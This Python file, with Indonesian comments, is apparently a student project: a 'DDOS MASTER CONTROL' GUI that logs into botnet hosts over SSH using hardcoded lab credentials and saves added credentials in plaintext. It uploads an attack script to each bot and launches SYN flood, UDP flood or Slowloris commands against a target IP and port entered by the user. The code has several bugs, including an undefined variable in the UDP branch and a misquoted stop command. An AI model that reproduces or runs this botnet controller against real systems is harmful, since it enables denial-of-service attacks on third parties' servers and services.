import customtkinter as ctk
import tkinter as tk
from PIL import Image
import paramiko
import threading

class DDOSGUI(ctk.CTk):
    def __init__(self, title, size):
        super().__init__()
        self.title(title)
        self.width = self.winfo_screenwidth()
        self.height = self.winfo_screenheight()
        self.x = (self.width/2) - (size[0]/2)
        self.y = (self.height/2) - (size[1]/2)
        self.geometry(f'{size[0]}x{size[1]}+{int(self.x)}+{int(self.y)}')

        self.head = ctk.CTkFrame(self, width=1230, height=77, fg_color=('#413737'), corner_radius=0)
        self.head.place(x=0,y=0)

        photos = self.image()
        self.strip = ctk.CTkButton(self.head,width=False,image=photos[4], text='',fg_color='#413737', hover_color='#413737', command=self.menu)
        self.strip.place(x=40, y=20)

        self.head_frame()
        self.home_page()

    def destroy_function(self, *widgets):
        for widget in widgets:
            widget.destroy()

    def image(self):
        icon_ddos = ctk.CTkImage(light_image=Image.open("Asset/icon_ddos.png"),size=(32, 32))
        icon_plus = ctk.CTkImage(light_image=Image.open("Asset/icon_plus.png"),size=(28, 28))
        home_page = ctk.CTkImage(light_image=Image.open("Asset/HomePage_6.png"),size=(1230, 670))
        logo_dropdown = ctk.CTkImage(light_image=Image.open("Asset/chevrons-down.png"),size=(46, 46))
        logo_hamburger = ctk.CTkImage(light_image=Image.open("Asset/menu.png"),size=(46, 46))
        status = ctk.CTkImage(light_image=Image.open("Asset/Group_3.png"),size=(772, 172))
        atk_pict = ctk.CTkImage(light_image=Image.open("Asset/btn_attack.png"),size=(236.5, 80.5))
        stop_pict = ctk.CTkImage(light_image=Image.open("Asset/btn_stop.png"),size=(240, 90))
        img_ddos = ctk.CTkImage(light_image=Image.open("Asset/image_8.png"),size=(203, 128))
        home = ctk.CTkImage(light_image=Image.open("Asset/home.png"),size=(40,40))
        f = ctk.CTkImage(light_image=Image.open("Asset/Add-BotNet.png"),size=(313,45))

        return icon_ddos, icon_plus, home_page, logo_dropdown, logo_hamburger, status, atk_pict, stop_pict, img_ddos, home, f

    def head_frame(self):
        photos = self.image()
        if hasattr(self, 'btn_drop') and hasattr(self, 'fr_menu'):
            self.destroy_function(self.btn_drop, self.fr_menu)

        #hamburger button
        self.btn_hmbr = ctk.CTkButton(self.head,width=False,image=photos[4], text='',fg_color='#413737', hover_color='#413737', command=self.menu)
        self.btn_hmbr.place(x=35, y=20)

        self.lb_head = ctk.CTkLabel(self.head, text="DDOS MASTER CONTROL", font=('Inter', 30,'bold'), text_color='white')
        self.lb_head.place(x=427,y=20)

    def menu(self):
        photos = self.image()
        if hasattr(self, 'btn_hmbr'):
            self.destroy_function(self.btn_hmbr)
        self.btn_drop = ctk.CTkButton(self.head, width=False,image=photos[3], text='', fg_color='#413737', hover_color='#413737',command=self.head_frame)
        self.btn_drop.place(x=35, y=15)
        #self.p.bind('<Button>')

        self.fr_menu = ctk.CTkFrame(self, width=159, height=183, fg_color='#413737', corner_radius=0)
        self.fr_menu.place(x=0,y=76)

        self.fr_btn0 = ctk.CTkButton(self.fr_menu, width=159, height=61.45, text='   Home',image=photos[9],
                                     fg_color='#413737', hover_color='#A73131',font=('Inter', 20, 'bold'),
                                     corner_radius=0, command=self.home_page)
        self.fr_btn0.place(x=0, y=0)

        self.fr_btn1 = ctk.CTkButton(self.fr_menu, width=159, height=61.45, text='   DDoS', image=photos[0], 
                            fg_color='#413737', hover_color='#A73131',font=('Inter', 20, 'bold'), 
                            corner_radius=0, command=self.window_ddos)
        self.fr_btn1.place(x=0,y=61)

        self.fr_btn2 = ctk.CTkButton(self.fr_menu, width=159, height=61.45, text='   Botnet', image=photos[1], 
                            fg_color='#413737', hover_color='#A73131',font=('Inter', 20, 'bold'),
                            corner_radius=0, command=self.window_add_ddos)
        self.fr_btn2.place(x=0,y=122)

    def home_page(self):
        self.head_frame()
        photos = self.image()
        self.hm_pg = ctk.CTkLabel(self, image=photos[2], text=' ')
        self.hm_pg.place(x=0,y=76)

    def window_ddos(self):
        self.head_frame()
        photos = self.image()
        self.ddos_fr = ctk.CTkFrame(self, width=1230, height=642, fg_color='#292121', corner_radius=0)
        self.ddos_fr.place(x=0, y=76)

        lb_atk = ctk.CTkLabel(self.ddos_fr, text='Attack Types',font=('Inter', 20, 'bold'), text_color='white')
        lb_atk.place(x=552, y=16)

        self.option_ddos = ctk.CTkSegmentedButton(self.ddos_fr,
                                        width=351,
                                        height=56.92,
                                        fg_color='#A73131',
                                        values=['Slowloris', 'UDP Flood', 'SYN Flood'],
                                        font=('Inter', 15, 'bold'),
                                        selected_color='#6794EA',
                                        unselected_color='#A73131',
                                        dynamic_resizing=False,
                                        corner_radius=10,
                                        command=self.option)
        self.option_ddos.place(x=440,y=54.08)
        self.option_ddos.set('Slowloris')

        lb_ip = ctk.CTkLabel(self.ddos_fr, text='Target IP', font=('Inter', 16, 'bold'), text_color='white')
        lb_ip.place(x=331,y=141)
        self.ent_ip = ctk.CTkEntry(self.ddos_fr, width=269, height=38, fg_color='white', corner_radius=7)
        self.ent_ip.place(x=329,y=169)

        lb_port = ctk.CTkLabel(self.ddos_fr, text='Port Number', font=('Inter', 16, 'bold'), text_color='white')
        lb_port.place(x=331,y=225)
        self.ent_port = ctk.CTkEntry(self.ddos_fr, width=171, height=38,fg_color='white', corner_radius=7)
        self.ent_port.place(x=329,y=253)

        self.lb_time = ctk.CTkLabel(self.ddos_fr, text='Total Request (1000)', font=('Inter', 16, 'bold'), text_color='white')
        self.lb_time.place(x=678,y=141)
        self.ent_ttl_req = ctk.CTkEntry(self.ddos_fr, width=226, height=38, fg_color='white',corner_radius=7)
        self.ent_ttl_req.place(x=676,y=169)
      
        self.lb_atk = ctk.CTkLabel(self.ddos_fr, text='Attack Duration', font=('Inter', 16, 'bold'), text_color='white')
        self.lb_atk.place(x=678,y=232)
        self.ent_atk_time = ctk.CTkEntry(self.ddos_fr, width=226, height=38, fg_color='white',corner_radius=7)
        self.ent_atk_time.place(x=676,y=260)
        
        lb_jmlh_bot = ctk.CTkLabel(self.ddos_fr, text='Masukan Jumlah Botnet yang ingin digunakan', font=('Inter', 15,'bold'), text_color='white')
        lb_jmlh_bot.place(x=245,y=369)
        self.ent_jmlh_bot = ctk.CTkEntry(self.ddos_fr, width=219, height=34, fg_color='white',corner_radius=7) #entry
        self.ent_jmlh_bot.place(x=245,y=397)

        lb2_jmlh_bot = ctk.CTkLabel(self.ddos_fr, text="Active Botnet's = [4]", font=('OpenSans', 15, 'bold'), text_color='white')
        lb2_jmlh_bot.place(x=504,y=401)

        status_use = ctk.CTkLabel(self.ddos_fr, text=" ", image=photos[5])
        status_use.place(x=79,y=460)

        #image for attack_btn
        self.atk_pict_use = ctk.CTkButton(self.ddos_fr, width=False,text="", image=photos[6], fg_color='#292121', cursor='hand2',hover=False,command=ddos.start_program)
        self.atk_pict_use.place(x=914, y=395)

        #image for stop_btn
        self.stop_pict_use = ctk.CTkButton(self.ddos_fr, width=False,text="", image=photos[7], fg_color='#292121', cursor='hand2',hover=False,command=ddos.stop_serangan_botnet)
        self.stop_pict_use.place(x=914, y=500)

        self.response1 = tk.messagebox.askquestion("Konfirmasi", "Apakah ada list bot?, kalau ada 'yes' dan isi nama filenya di jumlah botnet, jika 'no' default bot yang tersedia...")
        if self.response1=='yes':
            lb2_jmlh_bot.configure(text="Masukan nama filenya di samping! (file.txt)")
            self.ent_jmlh_bot.configure(placeholder_text='filename.txt')

        else:
            lb2_jmlh_bot.configure(text="Active Botnet's = [4]")  

    def window_add_ddos(self):
        self.head_frame()
        photos = self.image()
        new_frame = ctk.CTkFrame(self, width=1230, height=670, fg_color=('#292121'), corner_radius=0)
        new_frame.place(x=0,y=76)

        f_use = ctk.CTkLabel(new_frame, image=photos[10], text=' ')
        f_use.place(x=329, y=30)

        c_logo = ctk.CTkLabel(new_frame, image=photos[8], text=' ')
        c_logo.place(x=694, y=49)

        label = ctk.CTkLabel(new_frame,text='IP Address', font=('Inter', 16), text_color=('#FFFFFF'))
        label.place(x=331, y=106)

        self.add_ip = ctk.CTkEntry(new_frame, width = 269, height = 38)
        self.add_ip.place(x=329,y=134)

        label = ctk.CTkLabel(new_frame,text='Username', font=('Inter', 16), text_color=('#FFFFFF'))
        label.place(x=331,y=197)

        self.add_username = ctk.CTkEntry(new_frame,width=226, height=38)
        self.add_username.place(x=329, y=225)                

        label = ctk.CTkLabel(new_frame, text= 'Password', font=('Inter', 16), text_color=('#FFFFFF'))
        label.place(x=626, y=197)

        self.add_password = ctk.CTkEntry(new_frame, width= 226, height= 38, show='*')
        self.add_password.place(x=624 , y=225)

        lb_save_file = ctk.CTkLabel(new_frame, text='Save Bot?', font=('Arial', 16), text_color='white')
        lb_save_file.place(x=938,y=374)
        self.ent_save_file = ctk.CTkEntry(new_frame, width=226, height=38, placeholder_text='Filename.txt')
        self.ent_save_file.place(x=938,y=398)
        self.btn_save_file = ctk.CTkButton(new_frame,text="Save",width=151,height=43,fg_color='#253E5B',
                                      font=('Inter',20,'bold'),corner_radius=20, command=ddos.save_bot)
        self.btn_save_file.place(x=975,y=460)

        butn=ctk.CTkImage(light_image=Image.open("Asset/Group_2.png"),
                            size=(240, 69))
        self.add_pict_use = ctk.CTkButton(new_frame, width=False,text="", image=butn, fg_color='#292121', cursor='hand2',hover=False,command=ddos.add_botnet)
        self.add_pict_use.place(x=500, y=288)

        ext=ctk.CTkImage(light_image=Image.open("Asset/Group8.png"),
                            size=(788, 275))
        c_logo = ctk.CTkLabel(new_frame, image=ext, text=' ')
        c_logo.place(x=109, y=371)

        self.scrl_frm = ctk.CTkScrollableFrame(new_frame, width=710, height=10, fg_color='#443F3F', corner_radius=0)
        self.scrl_frm.place(x=120, y=420)

    def option(self, value):
        if value == 'SYN Flood':
            self.ent_ttl_req.configure(state='disabled', fg_color='red')
            self.lb_time.configure(text='---')
            self.lb_atk.configure(text='Attack Duration')


        elif value == 'UDP Flood':
            self.ent_ttl_req.configure(state='normal', fg_color='white')
            self.ent_atk_time.configure(state='normal', fg_color='white')
            self.lb_atk.configure(text='Time Pause')
            self.lb_time.configure(text='Total Request (1000)')

            return self.ent_ttl_req, self.ent_atk_time
        
        elif value == 'Slowloris':
            self.ent_ttl_req.configure(state='normal',fg_color='white')
            self.ent_atk_time.configure(state='normal',fg_color='white')
            self.lb_time.configure(text='Total Request (1000)')
            self.lb_atk.configure(text='Attack Duration')

            return self.ent_ttl_req, self.ent_atk_time
        else:
            pass

class BotnetAttack(DDOSGUI):
    def __init__(self, title, size):
        super().__init__(title, size)
        self.row = 0
        # list host yang akan digunakan untuk DDOS
        self.hosts = [
            {'ip': '192.168.2.4', 'port': 22, 'username': 'kali', 'password': 'kali'},
            {'ip': '192.168.2.5', 'port': 22, 'username': 'kali', 'password': 'kali'},
            {'ip': '192.168.2.6', 'port': 22, 'username': 'kali', 'password': 'kali'},
            {'ip': '192.168.2.7', 'port': 22, 'username': 'kali', 'password': 'kali'},
        ]
        self.hosts_yang_tersedia = []
    @staticmethod

    # Fungsi untuk menghubungkan ke host dan menjalankan perintah menggunakan ssh
    def run_command_on_host(self,host, port, username, password, command):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, port=port, username=username, password=password)
        
        # membuka koneksi dan file pada direktori botnet
        sftp = ssh_client.open_sftp()

        # memasukkan file zip ke botnet
        sftp.put('attack_script.py', '/home/'+username+'/Desktop/attack_script.py')
        sftp.close()
                
        # mengeksekusi command untuk setiap botnet
        stdin, stdout, stderr = ssh_client.exec_command(command)
        output = stdout.readlines()

        for line in output:
            print(line.rstrip())

        ssh_client.close()
    
    # Function untuk melakukan serangan DDOS
    def serangan_botnet(self,hosts):
        # Menghapus beberapa host dari hosts berdasarkan jumlah botnet yang diinginkan
        self.hosts_yang_tersedia = hosts
        
        # list jenis serangan
        self.tipe_serangan_valid = ['SYN Flood', 'UDP Flood', 'Slowloris']
        
        # memilih tipe serangan
        self.input_pilih_serangan = self.option_ddos.get()
        if self.input_pilih_serangan not in self.tipe_serangan_valid:
            tk.messagebox.showwarning(title='Error!', message='Invalid of type attack')
        
        elif self.input_pilih_serangan == "SYN Flood": 
            target_ip = self.ent_ip.get()
            port = int(self.ent_port.get())
            attack_duration = int(self.ent_atk_time.get())

            com_syn = f"export DISPLAY=:0.0; cd Desktop; echo 'kali' | sudo -S python3 attack_script.py syn {target_ip} {port} --to {attack_duration}"
            command = com_syn

        elif self.input_pilih_serangan == "UDP Flood":
            target_ip = self.ent_ip.get()
            port = int(self.ent_port.get())
            time_pause = self.ent_atk_time.get()
            
            com_udp = f"export DISPLAY=:0.0; cd Desktop; python3 attack_script.py udp {target_ip} {port} --s {time_pause} --to {attack_duration}"
            command = com_udp
                
        elif self.input_pilih_serangan == "Slowloris":
            target_ip = self.ent_ip.get()
            port = int(self.ent_port.get())
            attack_duration = int(self.ent_atk_time.get())
            total_requests = int(self.ent_ttl_req.get())
            
            com_slow = f"export DISPLAY=:0.0; cd Desktop; python3 attack_script.py slowloris {target_ip} {port} --ts {total_requests} --to {attack_duration}"
            command = com_slow
        
        # Membuat thread untuk setiap host
        try:
            threads = []
            for host in self.hosts_yang_tersedia:
                t = threading.Thread(target=self.run_command_on_host, args=(self,host['ip'], host['port'], host['username'], host['password'], command, self.input_pilih_serangan))
                t.start()
                threads.append(t)

            # Menunggu thread selesai
            for t in threads:
                t.join()
                
        except Exception as e:
            print(f"{e}")

    # function untuk menghentikan serangan DDOS pada botnet melalui ssh
    def stop_attacking_on_host(self,host, port, username, password, command):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, port=port, username=username, password=password)
        
        # mengeksekusi command untuk setiap botnet
        stdin, stdout, stderr = ssh_client.exec_command(command)
        output = stdout.readlines()

        for line in output:
            print(line.rstrip())

        ssh_client.close()
        
    # function untuk menghentikan serangan DDOS
    def stop_serangan_botnet(self):
        command = "echo 'kali | sudo -S killall python3'"
        
        # Membuat thread untuk setiap host
        threads = []
        for host in self.hosts_yang_tersedia:
            t = threading.Thread(target=self.stop_attacking_on_host, args=(host['ip'], host['port'], host['username'], host['password'], command))
            t.start()
            threads.append(t)

        # Menunggu thread selesai
        for t in threads:
            t.join()

    #Menajalankan script bot pertama kali
    def start_program(self):
        try :     
            if self.response1 == 'yes':
                file = self.ent_jmlh_bot.get()
                with open(file, 'r') as f:
                    for line in f:
                        # Mengambil nilai ip, username, dan password dari setiap baris
                        ip = line.strip().split(',')[0].split(': ')[1]
                        port = line.strip().split(',')[1].split(': ')[1]
                        username = line.strip().split(',')[2].split(': ')[1]
                        password = line.strip().split(',')[3].split(': ')[1]
                        self.hosts_yang_tersedia.append({'ip': ip, 'port': int(port), 'username': username, 'password': password})
                    lb = ctk.CTkLabel(self.ddos_fr, text='Your Botnet Was Successful. Enjoy :)', text_color='white',bg_color="#443F3F", font=('Inter', 24))
                    lb.place(x=267,y=539)
                self.serangan_botnet(self.hosts_yang_tersedia)
            else:
                input_botnet = int(self.ent_jmlh_bot.get())
                if input_botnet > len(self.hosts) or input_botnet == 0 or None:
                    tk.messagebox.showwarning(title='Error!', message='Invalid Botnet Amount!')
                else:
                    #status info botnet for default botnet
                    y = 479
                    self.status = 'Connecting...'
                    for item in self.hosts[:input_botnet]:
                        y+=33
                        ip = item['ip']
                        user = item['username']
                        lb = ctk.CTkLabel(self.ddos_fr, text=f"{' '*5}{user}@{ip}{' '*25}{user}{' '*25}{self.status}",
                                          text_color='white',bg_color="#443F3F", font=('Inter', 16))
                        lb.place(x=139,y=y)
                    self.serangan_botnet(self.hosts[:input_botnet])
        except Exception as e:
            tk.messagebox.showerror(title='Error!', message=e)
        finally:
            tk.messagebox.showinfo(title='Congrats!!!', message='jika ingin mengakhiri serangan klik "Stop Flooding", jika tidak tinggalkan pesan ini.')

    #Add botnet 
    def add_botnet(self):
        ip = self.add_ip.get()
        user = self.add_username.get()
        pw = self.add_password.get()
        try:
            self.hosts.append({'ip': ip, 'port': 22,'username': user, 'password': pw})
            print(self.hosts)
            if self.add_pict_use.cget('state') == 'normal':
                self.row+=1
                lb = ctk.CTkLabel(self.scrl_frm, text=user+'@'+ip+' '*20+user+' '*30+pw, 
                                  text_color='white', font=('Inter', 18), padx=60, pady=15)
                lb.grid(row=self.row, column=1)
            else:
                pass
        except Exception as e:
            response = tk.messagebox.askretrycancel("Konfirmasi", e)

    #save file bot
    def save_bot(self):
        sv = self.ent_save_file.get()
        with open(sv, 'w') as f:
            for host in self.hosts:
                line = f"ip: {host['ip']}, port: {host['port']}, username: {host['username']}, password: {host['password']}\n"
                f.write(line)
        if self.btn_save_file.cget('state') == 'normal':
            respone = tk.messagebox.askquestion('konfirmasi', 'Apakah ingin menyerang dengan botnet yang sudah ditambah?')
            if respone == 'yes':
                self.menu()
                self.window_ddos()
            else:
                pass


ddos = BotnetAttack("DDoS Application",(1230,720))
ddos.mainloop()
